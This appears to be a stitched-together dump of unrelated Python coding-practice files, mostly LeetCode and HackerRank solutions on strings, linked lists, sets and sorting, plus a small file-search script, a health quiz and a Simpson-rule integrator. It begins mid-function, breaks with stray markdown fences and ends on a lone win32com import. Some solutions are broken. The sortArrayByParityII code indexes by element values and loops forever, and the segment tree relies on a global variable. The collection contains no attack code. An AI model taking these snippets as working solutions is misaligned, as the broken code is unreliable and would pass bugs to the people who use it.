        next = current.next
        current.next = prev
        prev = current
        current = next
    return prev

class Solution:
    def reverseString(self, s: List[str]) -> None:
        """
        Do not return anything, modify s in-place instead.
        """
        head = 0
        temp = ""
        tail = len(s) - 1
        while head < tail:
            temp = s[head]
            s[head] = s[tail]
            s[tail] = temp
            head += 1
            tail -= 1

class Solution:
    def reverseParentheses(self, s: str) -> str:
        stack = []
        s = list(s)
        for i in range(len(s)):
            if s[i] == "(":
                stack.append(i)
                continue
            if s[i] == ")":
                idx = stack.pop()
                s[idx + 1 : i] = s[idx + 1 : i][::-1]
        ans = ""
        for i in s:
            if i == "(" or i == ")":
                continue
            ans += i
        return ans

# Write a function that takes a string as input and reverse only the vowels of a string.
#
# Example 1:
#
# Input: "hello"
# Output: "holle"
# Example 2:
#
# Input: "leetcode"
# Output: "leotcede"
# Note:
# The vowels does not include the letter "y".


class Solution:
    def reverseVowels(self, s):
        if len(s) == 0 or len(s) == 1:
            return s
        strs = []

        for char in s:
            strs.append(char)

        pointer1 = 0
        pointer2 = len(strs) - 1
        dict = {
            "a": 1,
            "e": 2,
            "i": 3,
            "o": 4,
            "u": 5,
            "A": 6,
            "E": 7,
            "I": 8,
            "O": 9,
            "U": 10,
        }

        while pointer1 < pointer2:

            while pointer1 <= pointer2 and strs[pointer1] not in dict:
                pointer1 += 1

            while pointer1 <= pointer2 and strs[pointer2] not in dict:
                pointer2 -= 1

            if (
                pointer1 <= pointer2
                and strs[pointer1] in dict
                and strs[pointer2] in dict
            ):
                strs[pointer1], strs[pointer2] = strs[pointer2], strs[pointer1]
                pointer1 += 1
                pointer2 -= 1

        return "".join(strs)

# Given a string, you need to reverse the order of characters in each
# word within a sentence while still preserving whitespace and initial
# word order.
#
# Example 1:
#
# Input: "Let's take LeetCode contest"
# Output: "s'teL ekat edoCteeL tsetnoc"
#
# Note: In the string, each word is separated by single space and
# there will not be any extra space in the string.


class Solution:
    def reverseStr(self, s):
        strs = s.split(" ")
        newstr = ""

        for word in strs:
            newstr += word[::-1] + " "

        return newstr[:-1]


if __name__ == "__main__":
    sentence = "Let's take LeetCode contest"
    print(Solution().reverseStr(sentence))

# S = pqr.mno
# Output: mno.pqr
# Explanation: After reversing the whole
# string , the input string becomes
# mno.pqr


def RevString(String):
    temp = []
    rev = []
    for i in String.split("."):  # O(n)
        temp.append(i)
    temp.reverse()
    for i in temp:  # O(n)
        rev.append(i)
        rev.append(".")
    for i in rev[:-1]:  # O(n)
        print(i, end="")


# total = 3*O(n)

String = "pqr.mno"
RevString(String)

def maximumWealth(accounts):
    global free
    global temp
    for i in accounts:
        for j in i:
            # print(j)
            temp += j
        free.append(temp)
        # print(" ")
        temp = 0
    return max(free)


# accounts=[[51,64,25,30,2,11,56,31,92,79,90,2,17],[82,79,81,96,30,18,34,86,42,16,61,27,35],[68,78,9,34,8,47,87,61,14,93,44,70,22],[48,61,69,73,15,84,69,2,74,98,85,38,39],[73,10,87,60,95,15,97,90,7,76,73,88,66],[82,78,73,86,1,71,25,52,37,57,77,4,6],[97,37,65,98,1,72,62,86,74,52,95,55,83],[23,23,88,74,40,55,69,65,17,49,67,48,32],[78,81,2,30,65,80,44,38,81,90,34,49,60],[65,37,56,17,92,7,85,11,81,58,65,1,22],[5,34,26,68,25,83,38,78,73,47,34,6,51],[36,24,43,66,11,35,35,24,66,52,50,14,37],[57,77,47,52,14,79,66,80,79,5,66,32,56],[79,93,35,22,97,53,82,75,74,84,62,60,40],[25,51,30,85,52,46,55,74,100,67,100,29,48],[16,69,95,12,94,37,23,77,5,93,19,82,4],[19,46,31,58,49,84,50,7,63,56,91,16,17],[4,39,34,84,10,19,11,14,41,22,58,5,68],[72,86,81,80,9,55,38,35,89,32,51,78,8],[76,64,62,17,50,79,41,42,33,3,26,21,61],[62,16,100,18,62,15,40,15,56,98,5,8,37],[41,16,92,52,68,53,93,11,11,37,59,1,4],[61,99,86,37,89,48,34,67,84,20,57,71,20],[54,84,93,28,98,67,96,29,98,100,46,31,70],[23,54,87,61,83,30,12,24,51,11,20,5,58],[87,23,39,50,67,21,100,15,18,79,44,92,51],[78,15,82,68,12,12,81,72,88,73,72,60,10],[9,62,87,80,92,100,85,100,19,19,14,25,9],[9,20,29,48,56,10,78,20,76,99,39,1,7],[71,7,61,51,6,76,48,65,13,52,1,1,37],[74,10,37,78,1,31,43,17,65,17,60,73,84],[9,61,30,54,2,65,98,75,70,42,87,30,91],[63,25,7,36,64,61,100,2,51,39,9,83,66],[4,15,35,51,97,72,30,80,38,35,41,63,64],[59,81,46,98,46,95,76,48,44,27,39,31,23],[11,86,11,71,6,1,6,31,79,36,66,19,62],[49,44,51,64,72,49,35,43,21,59,1,82,87],[62,29,51,73,66,4,51,76,7,13,58,36,6],[44,56,67,84,78,68,16,34,3,51,79,41,53],[27,20,34,46,5,49,18,31,52,99,21,20,46],[73,39,24,70,14,14,29,80,83,37,87,44,4],[5,60,31,11,98,89,51,59,35,95,39,2,56],[97,76,30,73,84,74,68,88,15,84,41,54,65],[56,92,3,66,63,25,63,30,77,73,95,19,53],[80,93,34,45,61,85,44,32,93,51,5,62,2],[35,95,26,4,56,23,13,92,83,66,29,94,93],[92,76,67,16,23,2,42,12,32,59,47,46,97]]

accounts = [[1, 2, 3], [3, 2, 1]]
free = []
temp = 0
print(maximumWealth(accounts))

class Solution:
    def romanToInt(self, s: str) -> int:
        ans = 0
        prev = ""
        for i in range(len(s)):
            if s[i] == "M":
                if prev == "C":
                    ans += 800
                    prev = "M"
                    continue
                ans += 1000
                prev = "M"
                continue
            if s[i] == "D":
                if prev == "C":
                    ans += 300
                    prev = "D"
                    continue
                ans += 500
                prev = "D"
                continue
            if s[i] == "C":
                if prev == "X":
                    ans += 80
                    prev = "C"
                    continue
                ans += 100
                prev = "C"
                continue
            if s[i] == "L":
                if prev == "X":
                    ans += 30
                    prev = "L"
                    continue
                ans += 50
                prev = "L"
                continue
            if s[i] == "X":
                if prev == "I":
                    ans += 8
                    prev = "X"
                    continue
                ans += 10
                prev = "X"
                continue
            if s[i] == "V":
                if prev == "I":
                    ans += 3
                    prev = "V"
                    continue
                ans += 5
                prev = "V"
                continue
            if s[i] == "I":
                ans += 1
                prev = "I"
        return ans

# Roman numerals are represented by seven different symbols: I, V, X, L, C, D and M.
#
# Symbol       Value
# I             1
# V             5
# X             10
# L             50
# C             100
# D             500
# M             1000
# For example, two is written as II in Roman numeral, just two one's added together.
# Twelve is written as, XII, which is simply X + II. The number twenty seven is written
# as XXVII, which is XX + V + II.
#
# Roman numerals are usually written largest to smallest from left to right. However,
# the numeral for four is not IIII. Instead, the number four is written as IV. Because
# the one is before the five we subtract it making four. The same principle applies to
# the number nine, which is written as IX. There are six instances where subtraction is used:
#
# I can be placed before V (5) and X (10) to make 4 and 9.
# X can be placed before L (50) and C (100) to make 40 and 90.
# C can be placed before D (500) and M (1000) to make 400 and 900.
# Given a roman numeral, convert it to an integer. Input is guaranteed to be within the range from 1 to 3999.
#
# Example 1:
#
# Input: "III"
# Output: 3
# Example 2:
#
# Input: "IV"
# Output: 4
# Example 3:
#
# Input: "IX"
# Output: 9
# Example 4:
#
# Input: "LVIII"
# Output: 58
# Explanation: L = 50, V= 5, III = 3.
# Example 5:
#
# Input: "MCMXCIV"
# Output: 1994
# Explanation: M = 1000, CM = 900, XC = 90 and IV = 4.


def roman_to_int(s):
    romanNumeral = {"I": 1, "V": 5, "X": 10, "L": 50, "C": 100, "D": 500, "M": 1000}

    prev = 0
    Sum = 0

    for i in s[::-1]:
        curr = romanNumeral[i]
        if curr < prev:
            Sum -= curr
        else:
            Sum += curr

        prev = curr

    return Sum


if __name__ == "__main__":
    # MMMCMXCIX => 3999
    ex1 = "MMMCMXCIX"
    ex2 = "I"
    ex3 = "IX"
    # "LVIII" => 58
    ex4 = "LVIII"

    print("The roman to int of " + ex1 + " is : " + str(roman_to_int(ex1)))
    print("The roman to int of " + ex2 + " is : " + str(roman_to_int(ex2)))
    print("The roman to int of " + ex3 + " is : " + str(roman_to_int(ex3)))
    print("The roman to int of " + ex4 + " is : " + str(roman_to_int(ex4)))

class Solution:
    def rotate(self, nums: List[int], k: int) -> None:
        """
        Do not return anything, modify nums in-place instead.
        """
        x = len(nums)
        A = [0] * x
        for i in range(0, x):
            A[(i + k) % x] = nums[i]
        for i in range(0, x):
            nums[i] = A[i]

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution:
    def rotateRight(self, head: ListNode, k: int) -> ListNode:
        if not head:
            return None
        if not k == 0:
            tail = head
            length = 1

            while tail.next:
                length += 1
                tail = tail.next

            k = k % length

            tail.next = head

            tempnode = head

            for _ in range(0, length - k - 1):
                tempnode = tempnode.next
            a = tempnode.next
            tempnode.next = None
            return a
        return head

# Given a linked list, rotate the list to the right by k places, where k is non-negative.
#
# Example 1:
#
# Input: 1->2->3->4->5->NULL, k = 2
# Output: 4->5->1->2->3->NULL
# Explanation:
# rotate 1 steps to the right: 5->1->2->3->4->NULL
# rotate 2 steps to the right: 4->5->1->2->3->NULL
# Example 2:
#
# Input: 0->1->2->NULL, k = 4
# Output: 2->0->1->NULL
# Explanation:
# rotate 1 steps to the right: 2->0->1->NULL
# rotate 2 steps to the right: 1->2->0->NULL
# rotate 3 steps to the right: 0->1->2->NULL
# rotate 4 steps to the right: 2->0->1->NULL


class ListNode:
    def __init__(self, x):
        self.val = x
        self.next = None


class Solution:
    def rotateRight(self, head, k):
        if not head:
            return head
        if not head.next:
            return head

        length = 0
        curr = head
        while curr:
            length += 1
            curr = curr.next

        k = k % length
        slow = fast = head

        for _ in range(k):
            fast = fast.next

        while fast.next:
            slow = slow.next
            fast = fast.next

        fast.next = head
        head = slow.next
        slow.next = None

        return head

def runningSum(array):
    temp = 0
    array_1 = []
    for count, i in enumerate(array):
        for j in range(count + 1):
            temp += array[j]
        array_1.append(temp)
        temp = 0
    return array_1
    #         print(count,i,j)


array = [1, 2, 3, 4]
print(runningSum(array))

# Health Calculator

# func to show health score of user
def healthScore():
    print(" ")
    numberOfFruits = int(input("Number Of Fruits You Eat in Week : "))
    numberOftimesFastFood = int(input("Number of Times You Eat FastFood in a Week : "))
    cigars = int(input("Cigars You Smoke In A Week : "))
    workoutTime = int(input("How Much minutes You Workout EveryDay : "))
    bodyMassIndex = int(input("Whats Your BodyMassIndex(BMI) : "))
    if 18 < bodyMassIndex < 26:
        print(" ")
        healthScore = (numberOfFruits + workoutTime + bodyMassIndex) - (
            cigars + numberOftimesFastFood
        )
        print(healthScore)
    else:
        print(" ")
        healthScore = (numberOfFruits + workoutTime) - (
            cigars + numberOftimesFastFood + bodyMassIndex
        )
        print(healthScore)


# main code
while True:
    startOrEnd = str(input("Start or End : "))
    if startOrEnd == "Start":
        print(healthScore())
        continue
    else:
        quit()

#! /bin/python3
#
# Search for keywords in files reachable from current directory.
# Written by davidhcefx, 2020.7.19. Originally in Bash.

from sys import argv
from os.path import basename
import readline
from subprocess import run, PIPE


VERBOSE = False
INSENSITIVE = False


def help():
    print(f"Syntax: {basename(argv[0])} (-i|-v|-h)")
    print("\t-i:\tCase insensitive search.")
    print("\t-v:\tVerbose.")
    print("\t-h:\tHelp.")


def green(text):
    return "\33[32m" + text + "\33[0m"


def main():
    # configure extension
    ext = input("Extensions: [c|cpp] ")

    if ext == "":
        ext = "c|cpp"
    elif ext.startswith("[") and ext.endswith("]"):
        ext.strip("[]")
    elif ext.startswith("(") and ext.endswith(")"):
        ext.strip("()")

    r = run(
        [
            "find",
            ".",
            "-type",
            "f",
            "-regex",
            ".*/.*\\.\\(" + ext.replace("|", "\\|") + "\\)",
        ],
        stdout=PIPE,
    )
    r.check_returncode()

    if len(r.stdout) == 0:
        print(f"It seems that no file match extension '{ext}'")
        exit(1)

    # configure search string (format: bytes)
    search_str = input("Search string: ").encode("utf8")
    if INSENSITIVE:
        search_str = search_str.upper()

    print("Searching for '" + search_str.decode("utf8") + "' ...")

    for name in r.stdout.decode("utf8").strip("\n").split("\n"):
        name_shown = False
        for line in open(name, "rb").read().split(b"\n"):
            if search_str in ((INSENSITIVE and line.upper()) or line):
                if not name_shown or VERBOSE:
                    print(green(name))
                    name_shown = True
                run(["grep", "--color=always", search_str], input=line)


if __name__ == "__main__":
    if len(argv) > 1:
        for arg in argv[1:]:
            if arg == "-i":
                INSENSITIVE = True
            elif arg == "-v":
                VERBOSE = True
            elif arg == "-h":
                help()
                exit(0)
    main()

class Solution:
    def searchInsert(self, nums: List[int], target: int) -> int:
        def binary(nums, low, high, target):
            if low <= high:
                mid = low + (high - low) // 2
                if nums[mid] == target:
                    return mid
                elif nums[mid] > target:
                    return binary(nums, low, mid - 1, target)
                else:
                    return binary(nums, mid + 1, high, target)
            else:
                return high + 1

        return binary(nums, 0, len(nums) - 1, target)


# Iterative Binary Search


class Solution:
    def searchInsert(self, nums: List[int], target: int) -> int:
        low = 0
        high = len(nums) - 1
        while low <= high:
            mid = (low + high) // 2
            if nums[mid] == target:
                return mid
            elif nums[mid] > target:
                high = mid - 1
            else:
                low = mid + 1
        else:
            return high + 1

from __future__ import print_function
import math


class SegmentTree:
    def __init__(self, A):
        self.N = len(A)
        self.st = [0] * (
            4 * self.N
        )  # approximate the overall size of segment tree with array N
        self.build(1, 0, self.N - 1)

    def left(self, idx):
        return idx * 2

    def right(self, idx):
        return idx * 2 + 1

    def build(self, idx, l, r):
        if l == r:
            self.st[idx] = A[l]
        else:
            mid = (l + r) // 2
            self.build(self.left(idx), l, mid)
            self.build(self.right(idx), mid + 1, r)
            self.st[idx] = max(self.st[self.left(idx)], self.st[self.right(idx)])

    def update(self, a, b, val):
        return self.update_recursive(1, 0, self.N - 1, a - 1, b - 1, val)

    def update_recursive(
        self, idx, l, r, a, b, val
    ):  # update(1, 1, N, a, b, v) for update val v to [a,b]
        if r < a or l > b:
            return True
        if l == r:
            self.st[idx] = val
            return True
        mid = (l + r) // 2
        self.update_recursive(self.left(idx), l, mid, a, b, val)
        self.update_recursive(self.right(idx), mid + 1, r, a, b, val)
        self.st[idx] = max(self.st[self.left(idx)], self.st[self.right(idx)])
        return True

    def query(self, a, b):
        return self.query_recursive(1, 0, self.N - 1, a - 1, b - 1)

    def query_recursive(
        self, idx, l, r, a, b
    ):  # query(1, 1, N, a, b) for query max of [a,b]
        if r < a or l > b:
            return -math.inf
        if l >= a and r <= b:
            return self.st[idx]
        mid = (l + r) // 2
        q1 = self.query_recursive(self.left(idx), l, mid, a, b)
        q2 = self.query_recursive(self.right(idx), mid + 1, r, a, b)
        return max(q1, q2)

    def showData(self):
        showList = []
        for i in range(1, N + 1):
            showList += [self.query(i, i)]
        print(showList)


if __name__ == "__main__":
    A = [1, 2, -4, 7, 3, -5, 6, 11, -20, 9, 14, 15, 5, 2, -8]
    N = 15
    segt = SegmentTree(A)
    print(segt.query(4, 6))
    print(segt.query(7, 11))
    print(segt.query(7, 12))
    segt.update(1, 3, 111)
    print(segt.query(1, 15))
    segt.update(7, 8, 235)
    segt.showData()

def selectionSort(array, n):

    for i in range(n):
        minimum = i

        for j in range(i + 1, n):

            # to sort in descending order, change > to < in this line
            # select the minimum element in each loop
            if array[j] < array[minimum]:
                minimum = j

        # put min at the correct position
        (array[i], array[minimum]) = (array[minimum], array[i])


data = []
size = int(input("Enter size of array : "))
print("Enter array elements: ")
for i in range(size):
    e = int(input())
    data.append(e)
selectionSort(data, size)
print("Sorted Array in Ascending Order:")
print(data)

# Given two sentences words1, words2 (each represented as an array of strings),
# and a list of similar word pairs pairs, determine if two sentences are similar.
#
# For example, "great acting skills" and "fine drama talent" are similar,
# if the similar word pairs are pairs = [["great", "fine"], ["acting","drama"], ["skills","talent"]].
#
# Note that the similarity relation is not transitive. For example,
# if "great" and "fine" are similar, and "fine" and "good" are similar,
# "great" and "good" are not necessarily similar.
#
# However, similarity is symmetric. For example, "great" and "fine"
# being similar is the same as "fine" and "great" being similar.
#
# Also, a word is always similar with itself. For example, the sentences
# words1 = ["great"], words2 = ["great"], pairs = [] are similar, even though
# there are no specified similar word pairs.
#
# Finally, sentences can only be similar if they have the same number of words.
# So a sentence like words1 = ["great"] can never be similar to words2 = ["doubleplus","good"].


class Solution:
    def areSentencesSimilar(self, words1, words2, pairs):

        if len(words1) != len(words2):
            return False

        for i in range(len(words1)):

            arr = [words1[i], words2[i]]
            arr_rev = [words2[i], words1[i]]

            if arr not in pairs and arr_rev not in pairs:
                if words1[i] != words2[i]:
                    return False

        return True

punctuation_chars = ["'", '"', ",", ".", "!", ":", ";", "#", "@"]

# lists of words to use
def strip_punctuation(wrd):
    for i in wrd:
        if i in punctuation_chars:
            wrd = wrd.replace(i, "")
    return wrd


def get_pos(x):
    s = x.lower()
    s2 = strip_punctuation(s)
    count = 0
    s1 = s2.split(" ")
    for i in s1:
        if i in positive_words:
            count += 1
    return count


def get_neg(x):
    s = x.lower()
    s2 = strip_punctuation(s)
    count = 0
    s1 = s2.split(" ")
    for i in s1:
        if i in negative_words:
            count += 1
    return count


positive_words = []
with open("positive_words.txt") as pos_f:
    for lin in pos_f:
        if lin[0] != ";" and lin[0] != "\n":
            positive_words.append(lin.strip())


negative_words = []
with open("negative_words.txt") as pos_f:
    for lin in pos_f:
        if lin[0] != ";" and lin[0] != "\n":
            negative_words.append(lin.strip())
fobj = open("project_twitter_data.csv", "r")
y = fobj.readlines()
Positive = []
Negative = []
no_of_retweets = []
no_of_replies = []
Netscore = []
newf = []
for i in y[1:]:
    j = i.strip().split(",")
    Positive += [get_pos(j[0])]
    Negative += [get_neg(j[0])]
    no_of_retweets += [j[1]]
    no_of_replies += [j[2]]
Netscore = []
f1 = open("resulting_data.csv", "w")
f1.write(
    "Number of Retweets, Number of Replies, Positive Score, Negative Score, Net Score\n"
)
for j in range(len(y[1 : len(y)])):
    Netscore += [Positive[j] - Negative[j]]
    f1.write(
        "{},{},{},{},{}".format(
            no_of_retweets[j], no_of_replies[j], Positive[j], Negative[j], Netscore[j]
        )
    )
    f1.write("\n")

for _ in range(int(input())):
    s = input()
    l = len(s)
    for i in range(1, l // 2 + 1):
        check = s[:i]
        add = int(check)
        while check in s:
            add += 1
            check += f"{add}"
            if check == s:
                break
        else:
            continue
        print("YES", s[:i])
        break
    else:
        print("NO")

# Enter your code here. Read input from STDIN. Print output to STDOUT
n = int(input())
c = set()
for i in range(n):
    c.add(input())
print(len(c))

# Enter your code here. Read input from STDIN. Print output to STDOUT
e = int(input())
english = set(map(int, input().split()))
f = int(input())
french = set(map(int, input().split()))
print(len(english.intersection(french)))

n = int(input())
s = set(map(int, input().split()))
N = int(input())
queries = [input().split() for i in range(N)]
for i in range(N):
    if queries[i][0] == "pop":
        s.pop()
    if queries[i][0] == "remove":
        if int(queries[i][1]) in s:
            s.remove(int(queries[i][1]))
    if queries[i][0] == "discard":
        s.discard(int(queries[i][1]))
print(sum(s))

# Enter your code here. Read input from STDIN. Print output to STDOUT
e = int(input())
english = set(map(int, input().split()))
f = int(input())
french = set(map(int, input().split()))
print(len(english.intersection(french)))

# Enter your code here. Read input from STDIN. Print output to STDOUT
_ = int(input())
s1 = set(map(int, input().split()))
N = int(input())

for _ in range(N):
    cmd, _ = input().split()
    s2 = set(map(int, input().split()))
    if cmd == "intersection_update":
        s1.intersection_update(s2)
    elif cmd == "update":
        s1.update(s2)
    elif cmd == "symmetric_difference_update":
        s1.symmetric_difference_update(s2)
    elif cmd == "difference_update":
        s1.difference_update(s2)

print(sum(s1))

# Enter your code here. Read input from STDIN. Print output to STDOUT
e = int(input())
english = set(map(int, input().split()))
f = int(input())
french = set(map(int, input().split()))
print(len(english.symmetric_difference(french)))

# Enter your code here. Read input from STDIN. Print output to STDOUT
e = int(input())
english = set(map(int, input().split()))
f = int(input())
french = set(map(int, input().split()))
print(len(english.union(french)))

#!/bin/python3

import math
import os
import random
import re
import sys
from collections import Counter

# Complete the sherlockAndAnagrams function below.
def sherlockAndAnagrams(s):
    if all(value == 0 for value in Counter(s).values()):
        return 0
    substrings = []
    c = 0
    for i in range(0, len(s)):
        for j in range(i + 1, len(s) + 1):
            substrings.append(s[i:j])
    sub_counts = [
        "".join(["{0}{1}".format(x, y) for (x, y) in sorted(Counter(sub).items())])
        for sub in substrings
    ]
    return sum([(v * (v - 1) // 2) for v in Counter(sub_counts).values()])


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    q = int(input())

    for q_itr in range(q):
        s = input()

        result = sherlockAndAnagrams(s)

        fptr.write(str(result) + "\n")

    fptr.close()

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the decentNumber function below.
def decentNumber(n):
    if n % 3 == 0 and n != 0:
        print(int("5" * n))
    elif n % 3 == 1 and n >= 10:
        print(int(((n - 10) * "5") + (10 * "3")))
    elif n % 3 == 2 and n >= 5:
        print(int(((n - 5) * "5") + (5 * "3")))
    else:
        print(-1)


if __name__ == "__main__":
    t = int(input().strip())

    for t_itr in range(t):
        n = int(input().strip())

        decentNumber(n)

class Solution:
    def __init__(self, nums: List[int]):
        self.nums = nums
        shuf = self.nums.copy()
        self.shuf = shuf

    def reset(self) -> List[int]:
        """
        Resets the array to its original configuration and return it.
        """
        self.shuf = self.nums.copy()
        return self.shuf

    def shuffle(self) -> List[int]:
        """
        Returns a random shuffling of the array.
        """
        x = len(self.nums)
        for i in range(x):
            j = random.randrange(i, x)
            self.shuf[i], self.shuf[j] = self.shuf[j], self.shuf[i]
        return self.shuf


# Your Solution object will be instantiated and called as such:
# obj = Solution(nums)
# param_1 = obj.reset()
# param_2 = obj.shuffle()

def shuffle(nums, n):
    i = 1
    temp = []
    temp_new = []
    while i <= 2 * n:
        if i % 2 == 1:
            if i == 1:
                temp.append(i)
            else:
                temp.append(i - int(i / 2))
        else:
            temp.append(int(n + (i / 2)))
        i += 1
    for i in temp:
        temp_new.append(nums[i - 1])

    return temp_new


nums = [2, 5, 1, 3, 4, 7]
n = 3

shuffle(nums, n)

#!/bin/python3

import os
import sys

#
# Complete the simpleArraySum function below.
#
def simpleArraySum(ar):
    #
    # Write your code here.
    #
    return sum(ar)


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    ar_count = int(input())

    ar = list(map(int, input().rstrip().split()))

    result = simpleArraySum(ar)

    fptr.write(str(result) + "\n")

    fptr.close()

class Solution:
    # @param A : string
    # @return a strings
    def simplifyPath(self, A):
        A = A.split("/")
        op = ""
        stack = []
        for i in range(len(A)):
            if A[i].isalpha():
                stack.append(A[i])
                continue
            if A[i] == ".":
                continue
            if A[i] == "..":
                if stack:
                    stack.pop()
        for i in range(len(stack)):
            op += "/" + stack[i]
        return op if op else "/"

# from collections import deque


class Solution:
    def simplifyPath(self, path: str) -> str:
        if len(path) == 0 or path == None or path == "":
            return "/"

        p = path.split("/")
        stack = []
        for item in p:
            if item == "..":
                if stack:
                    stack.pop()
                continue
            if item == "." or len(item) == 0:
                pass
            else:
                stack.append(item)
        return "/" + "/".join(stack)
```

```py
Numerical integration or quadrature for a smooth function f with known values at x_i

This method is the classical approch of suming 'Equally Spaced Abscissas'

method 2:
"Simpson Rule"
```

```py
from __future__ import print_function


def method_2(boundary, steps):
    # "Simpson Rule"
    # int(f) = delta_x/2 * (b-a)/3*(f1 + 4f2 + 2f_3 + ... + fn)
    h = (boundary[1] - boundary[0]) / steps
    a = boundary[0]
    b = boundary[1]
    x_i = makePoints(a, b, h)
    y = 0.0
    y += (h / 3.0) * f(a)
    cnt = 2
    for i in x_i:
        y += (h / 3) * (4 - 2 * (cnt % 2)) * f(i)
        cnt += 1
    y += (h / 3.0) * f(b)
    return y


def makePoints(a, b, h):
    x = a + h
    while x < (b - h):
        yield x
        x = x + h


def f(x):  # enter your function here
    y = (x - 0) * (x - 0)
    return y


def main():
    a = 0.0  # Lower bound of integration
    b = 1.0  # Upper bound of integration
    steps = 10.0  # define number of steps or resolution
    boundary = [a, b]  # define boundary of integration
    y = method_2(boundary, steps)
    print("y = {0}".format(y))


if __name__ == "__main__":
    main()

class Solution:
    def singleNumber(self, nums: List[int]) -> int:
        return int(((sum(set(nums)) * 3) - sum(nums)) / 2)

class Solution:
    def singleNumber(self, nums: List[int]) -> List[int]:
        ans = []
        for i in set(nums):
            if nums.count(i) == 1:
                ans.append(i)
                if len(ans) == 2:
                    return ans
        return ans

# There is a special keyboard with all keys in a single row.
#
# Given a string keyboard of length 26 indicating the layout of the keyboard
# (indexed from 0 to 25), initially your finger is at index 0. To type a character,
# you have to move your finger to the index of the desired character. The time taken
# to move your finger from index i to index j is |i - j|.
#
# You want to type a string word. Write a function to calculate how much time it
# takes to type it with one finger.
#
# Example 1:
# Input: keyboard = "abcdefghijklmnopqrstuvwxyz", word = "cba"
# Output: 4
# Explanation: The index moves from 0 to 2 to write 'c' then to 1 to write 'b'
# then to 0 again to write 'a'.
# Total time = 2 + 1 + 1 = 4.
#
# Example 2:
# Input: keyboard = "pqrstuvwxyzabcdefghijklmno", word = "leetcode"
# Output: 73


class Solution:
    def calculateTime(self, keyboard, word):
        # dict = {}
        # for i in range(len(keyboard)):
        #     dict[keyboard[i]] = i

        total = 0
        i = 0
        for char in word:
            total += abs(i - keyboard.index(char))
            i = keyboard.index(char)

        return total

n = int(input())
prices = []
for i in range(n):
    prices.append(int(input()))
prices.sort()
mx = -1
for i in range(n):
    profit = prices[i] * (len(prices) - i)
    if profit > mx:
        mx = profit
print(mx)
```

````py
922. Sort Array By Parity II
Given an array A of non-negative integers, half of the integers in A are odd, and half of the integers are even.

Sort the array so that whenever A[i] is odd, i is odd; and whenever A[i] is even, i is even.

You may return any answer array that satisfies this condition.



Example 1:

Input: [4,2,5,7]
Output: [4,5,2,7]
Explanation: [4,7,2,5], [2,5,4,7], [2,7,4,5] would also have been accepted.


Note:

2 <= A.length <= 20000
A.length % 2 == 0
0 <= A[i] <= 1000```


```py


class Solution:
    def sortArrayByParityII(self, A):
        """
        :type A: List[int]
        :rtype: List[int]
        """

        # declaring two empty arrays, one for even
        # one for odd numbers
        A1 = []
        A2 = []

        # output array
        result = []

        # diving each elements in A with 2 to see
        # if the number is even or odd
        for i in A:

            if i % 2 == 0:
                A1.append(A[i])
            else:
                A2.append(A[i])

        # appending the first two elements to the result array
        result.append(A1[0])

        result.append(A2[0])

        # checking remaining elements to append into result
        while i > 1:

            if i % 2 == 0:
                result.append(A1[i])

            else:
                result.append(A2[i])

        return result

from collections import Counter


class Solution:
    def sortColors(self, nums: List[int]) -> None:
        """
        Do not return anything, modify nums in-place instead.
        """
        n = Counter(nums)
        nums.clear()
        for v in range(3):
            for i in range(n[v]):
                nums.append(v)

# Given an array with n objects colored red, white or blue, sort them in-place so
# that objects of the same color are adjacent, with the colors in the order red,
# white and blue.
#
# Here, we will use the integers 0, 1, and 2 to represent the color red, white,
# and blue respectively.
#
# Note: You are not suppose to use the library's sort function for this problem.
#
# Example:
#
# Input: [2,0,2,1,1,0]
# Output: [0,0,1,1,2,2]
# Follow up:
#
# A rather straight forward solution is a two-pass algorithm using counting sort.
# First, iterate the array counting number of 0's, 1's, and 2's, then overwrite '
# 'array with total number of 0's, then 1's and followed by 2's.
# Could you come up with a one-pass algorithm using only constant space?


class Solution:
    def sortColors(self, nums):

        index = 0
        zero_index = 0
        two_index = len(nums) - 1

        while index <= two_index:
            if nums[index] == 0:
                nums[index], nums[zero_index] = nums[zero_index], nums[index]
                index += 1
                zero_index += 1
            elif nums[index] == 2:
                nums[index], nums[two_index] = nums[two_index], nums[index]
                two_index -= 1
            else:
                index += 1

# Given an array of integers nums, sort the array in ascending order.
#
# Example 1:
#
# Input: nums = [5,2,3,1]
# Output: [1,2,3,5]
# Example 2:
#
# Input: nums = [5,1,1,2,0,0]
# Output: [0,0,1,1,2,5]


def sortArray(nums):
    def helper(nums, start, end):

        if start >= end:
            return

        pivot = start
        left = start + 1
        right = end

        while left <= right:

            if nums[left] > nums[pivot] and nums[right] < nums[pivot]:
                nums[left], nums[right] = nums[right], nums[left]

            if nums[left] < nums[pivot]:
                left += 1

            if nums[right] > nums[pivot]:
                right -= 1

        nums[pivot], nums[right] = nums[right], nums[pivot]

        leftSubArrayisSmaller = right - 1 - start < end - (right + 1)

        if leftSubArrayisSmaller:
            helper(nums, start, right - 1)
            helper(nums, right + 1, end)
        else:
            helper(nums, right + 1, end)
            helper(nums, start, right - 1)

    helper(nums, 0, len(nums) - 1)
    return nums

# # Given an array of size N containing only 0s, 1s, and 2s; sort the array in ascending order.

# # Input:
# # N = 5
# # arr[]= {0 2 1 2 0}
# # Output:
# # 0 0 1 2 2
# # Explanation:
# # 0s 1s and 2s are segregated
# # into ascending order.

# def sort012(arr):
#     sample={}
#     result=[]
#     for index in arr:
#         if index in sample.keys():
#             sample[index]+=1
#         else:
#             sample[index]=1

#     for temp in range(sample[0]):
#         result.append(0)


#     for temp in range(sample[1]):
#         result.append(1)

#     for temp in range(sample[2]):
#         result.append(2)


#     for printing in result:
#         print(printing,end=" ")


# arr= [0,2,1,2,0]
# sort012(arr)


class Solution:
    def sort012(self, arr, n):
        sample = {}
        result = []
        for index in arr:
            if index in sample.keys():
                sample[index] += 1
            else:
                sample[index] = 1

        for temp in range(sample[0]):
            result.append(0)

        for temp in range(sample[1]):
            result.append(1)

        for temp in range(sample[2]):
            result.append(2)

        arr = []
        arr = result

        return arr


if __name__ == "__main__":
    t = int(input())
    for _ in range(t):
        n = int(input())
        arr = [int(x) for x in input().strip().split()]
        ob = Solution()
        arr = ob.sort012(arr, n)
        for i in arr:
            print(i, end=" ")
        print()

from collections import Counter


def matchingStrings(strings, queries):
    ans = []
    c = Counter(strings)
    for i in queries:
        if i in c:
            ans.append(c[i])
        else:
            ans.append(0)
    return ans

from win32com.client import Dispatch
